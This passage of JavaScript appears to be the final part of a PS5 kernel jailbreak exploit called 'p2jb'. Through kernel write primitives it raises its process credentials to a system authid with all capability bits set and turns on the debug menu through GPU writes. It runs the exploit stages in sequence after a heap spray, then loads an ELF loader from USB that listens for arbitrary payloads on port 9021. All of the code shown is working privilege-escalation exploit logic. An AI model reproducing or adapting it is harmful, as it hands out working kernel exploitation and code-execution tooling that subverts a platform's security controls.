                await ulog("  qa_flags before: " + toHex(qa_flags));
                await gpu.write_dword(qa_flags_addr, qa_flags | 0x10300n);
                const qa_flags_after = await kernel.read_dword(qa_flags_addr);
                await ulog("  qa_flags after:  " + toHex(qa_flags_after));

                const utoken_flags = await kernel.read_byte(utoken_flags_addr);
                await ulog("  utoken_flags before: " + toHex(utoken_flags));
                await gpu.write_byte(utoken_flags_addr, utoken_flags | 0x1n);
                const utoken_flags_after = await kernel.read_byte(utoken_flags_addr);
                await ulog("  utoken_flags after:  " + toHex(utoken_flags_after));

                await ulog("stage_debug: debug menu enabled");
            } catch (e) {
                await ulog("stage_debug: failed: " + e.message +
                    " (jailbreak unaffected)");
            }
        }

        async function stage7(S) {
            send_notification("Stage 7\nFinalize: authid + caps");

            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCEAUTHID, SYSTEM_AUTHID);
            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS0, 0xFFFFFFFFFFFFFFFFn);
            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS1, 0xFFFFFFFFFFFFFFFFn);

            await ulog("stage7: jailbreak complete; authid+caps maximized");
            send_notification(p2jb_version + "\nFW=" + FW_VERSION + "\nJailbroken");

            await ulog("stage7: 'Jailbroken' notification sent -> stage_load_elf");

        }

        async function stage_load_elf(S) {

            await ulog("stage_elfldr: entered");
            if (!LAUNCH_ELF_LOADER) {
                await ulog("stage_elfldr: LAUNCH_ELF_LOADER=false - skipped");
                return;
            }
            if (!S.data_base_ok) {
                await ulog("stage_elfldr: kernel data_base not resolved/verified " +
                    "in stage6 - elf loader skipped");
                send_notification("Stage 7\nelf loader skipped (no data_base)");
                return;
            }
            try {
                if (typeof elf_parse !== "function" || typeof elf_run !== "function" ||
                    typeof elf_wait_for_exit !== "function" ||
                    typeof ipv6_kernel_rw === "undefined") {
                    await ulog("stage_elfldr: framework elf_parse/elf_run/" +
                        "elf_wait_for_exit/ipv6_kernel_rw not in scope - skipped");
                    send_notification("Stage 7\nelf loader unavailable - skipped");
                    return;
                }

                await ulog("stage_elfldr: scanning /mnt/usb0..7 for elfldr...");
                const usb_names = ["elfldr_1320.elf", "elfldr.elf"];
                let elf_path = null;
                for (let u = 0; u < 8 && !elf_path; u++) {
                    for (const name of usb_names) {
                        const p = "/mnt/usb" + u + "/" + name;
                        if (file_exists(p)) { elf_path = p; break; }
                    }
                }
                if (!elf_path) {
                    await ulog("stage_elfldr: elfldr not found on /mnt/usb0../usb7");
                    send_notification("Stage 7\nelfldr_1320.elf NOT FOUND on USB\n" +
                        "(plug a FAT32/exFAT USB with elfldr_1320.elf)");
                    return;
                }
                await ulog("stage_elfldr: found " + elf_path);

                ipv6_kernel_rw.init(S.fd_ofiles, S.kread64, S.kwrite64);
                kernel.addr.data_base = S.data_base;
                await ulog("stage_elfldr: ipv6_kernel_rw built (master_sock=" +
                    ipv6_kernel_rw.data.master_sock + " victim_sock=" +
                    ipv6_kernel_rw.data.victim_sock + ")");

                const pin_sock = (fd) => {
                    const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
                    if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
                    const so = S.kread64(fp);
                    if (so === 0n || (so >> 48n) !== 0xFFFFn) return;
                    S.kwrite32(so, 0x100);
                };
                pin_sock(ipv6_kernel_rw.data.master_sock);
                pin_sock(ipv6_kernel_rw.data.victim_sock);

                const pin_pipe_fd = (fd) => {
                    const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
                    if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
                    const rc = S.kread32(fp + 0x28n);
                    if (rc > 0n && rc < 0x10000n)
                        S.kwrite32(fp + 0x28n, Number(rc) + 0x100);
                };
                pin_pipe_fd(ipv6_kernel_rw.data.pipe_read_fd);
                pin_pipe_fd(ipv6_kernel_rw.data.pipe_write_fd);
                await ulog("stage_elfldr: handoff pipe + sockets pinned");

                const elf_data = read_file(elf_path);
                await ulog("stage_elfldr: read " + elf_data.length +
                    " bytes; parsing...");
                const entry = await elf_parse(elf_data);
                await ulog("stage_elfldr: elf entry=" + toHex(entry) +
                    "; spawning elfldr...");
                const { thr_handle, payloadout } = await elf_run(entry, elf_path);

                await ulog("stage_elfldr: elfldr spawned - joining...");
                await elf_wait_for_exit(thr_handle, payloadout);
                const out = read32(payloadout);
                await ulog("stage_elfldr: Thrd join done, payloadout = " + toHex(out));
                await ulog("stage_elfldr: daemon should be listening on :9021");
                send_notification("Stage 7\nelfldr running - send your ELF to\n" +
                    "<ps5-ip>:9021  (e.g. BD-UN-JB unpatcher)");
            } catch (e) {
                await ulog("stage_elfldr: failed: " + e.message);
                send_notification("Stage 7\nelfldr failed: " + e.message +
                    "\n(jailbreak still complete)");
            }
        }

        send_notification(p2jb_version);

        try {
            if (typeof is_jailbroken === "function" && is_jailbroken()) {
                send_notification("p2jb: already jailbroken");
                return;
            }
            failcheck_path = "/" + get_nidpath() + "/common_temp/p2jb.fail";
            if (file_exists(failcheck_path) ||
                file_exists("/user/temp/common_temp/p2jb.fail")) {
                send_notification("p2jb already ran this boot - reboot your\n" +
                    "PS5 before running p2jb again");
                return;
            }
        } catch (_) { failcheck_path = null; }

        ensure_kernel_offset();

        my_init_threading();

        const S = make_state();

        setup_cpu_masks(S);
        setup_worker_sockets(S);
        setup_iov_buffers(S);
        setup_uio_buffers(S);
        setup_pipes_kernrw(S);
        await ulog("pipes master=" + S.master_rfd + "," + S.master_wfd +
            " victim=" + S.victim_rfd + "," + S.victim_wfd);

        /*const MAX_MASTER_RFD = 34;
        if (S.master_rfd > MAX_MASTER_RFD) {
            fail("pipe shift detected (got master=" + S.master_rfd + "," +
                S.master_wfd + " victim=" + S.victim_rfd + "," + S.victim_wfd +
                ", need master_rfd <= " + MAX_MASTER_RFD + ") - host noisy, " +
                "restart YouTube, wait longer, retry. Kernel UNTOUCHED.");
        }*/
        await ulog("host OK - starting ~2 hour leak; no further log output " +
            "until stage 0 (this is normal, do not interrupt)");

        setup_workers(S);
        setup_ipv6_spray(S);

        apply_main_thread_pinning(S);
        await prepare_fds(S);
        await stage0(S);

        let s123_ok = false;
        for (let r = 1; r <= 8 && !s123_ok; r++) {
            try {
                await stage1(S);
                await stage2(S);
                await stage3(S);
                s123_ok = true;
            } catch (e) {
                if (r < 8) {
                    try { repair_triplets(S); } catch (_) { }
                    nanosleep_ms(500);
                }
            }
        }
        if (!s123_ok) fail("stages 1-3 failed after 8 attempts");

        await stage4(S);
        await stage5(S);

        await stage6(S);
        await stage7(S);
        await stage_load_elf(S);

        await ulog("=== p2jb complete ===");

    } catch (e) {
        try { await log("p2jb FATAL: " + e.message); } catch (_) { }
        try { send_notification("p2jb FAILED: " + e.message); } catch (_) { }
    }
})();
